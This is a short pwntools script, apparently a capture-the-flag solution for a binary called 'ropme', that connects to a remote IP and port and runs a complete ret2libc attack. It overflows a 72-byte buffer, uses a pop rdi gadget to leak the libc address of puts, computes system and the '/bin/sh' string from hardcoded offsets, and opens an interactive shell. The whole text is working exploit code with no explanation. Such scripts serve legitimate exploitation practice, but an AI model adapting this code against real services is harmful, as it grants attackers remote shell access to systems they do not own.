from pwn import *

#proc = process("./ropme")
proc = remote("134.209.27.142", 32512)
context(os="linux", arch="amd64")
binary = ELF("./ropme")

JUNK = b"A" * 72
main = p64(binary.symbols['main'])
got_puts = p64(binary.got['puts'])
plt_puts = p64(binary.plt['puts'])
pop_rdi = p64(0x4006d3)

payload = JUNK 
payload += pop_rdi
payload += got_puts
payload += plt_puts
payload += main

proc.recvline()
proc.sendline(payload)

leaked = u64(proc.recv(6) + "\x00\x00") - 0x6f690
system = leaked + 0x45390
shstr = leaked + 0x18cd17
exit = leaked + 0x3a030

payload = JUNK
payload += pop_rdi
payload += p64(shstr)
payload += p64(system)
#payload += p64(exit)

proc.recvline()
proc.sendline(payload)
proc.interactive()
#print hex(system)
